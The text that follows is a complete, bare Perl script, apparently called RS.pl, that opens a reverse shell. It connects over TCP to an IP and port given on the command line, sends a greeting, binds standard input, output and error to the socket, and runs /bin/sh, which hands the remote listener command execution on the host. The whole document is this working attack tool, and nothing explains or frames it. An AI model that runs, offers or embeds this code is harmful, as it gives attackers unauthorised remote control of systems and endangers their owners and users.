#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;
my $ARGC = @ARGV;
# [+] RS.pl <ip> <port>
exit() if($ARGC!=2);
my($Host, $Port) = ($ARGV[0], $ARGV[1]);
*SOCK = IO::Socket::INET->new (
	PeerAddr => $Host,
	PeerPort => $Port,
	Proto    => 'tcp',
	Type     => SOCK_STREAM);
print SOCK "[+] Hello.\n";
while(<SOCK>) {
	open STDIN,  "<&SOCK";
	open STDOUT, "<&SOCK";
	open STDERR, "<&SOCK";
	system('/bin/sh');
}
close(SOCK);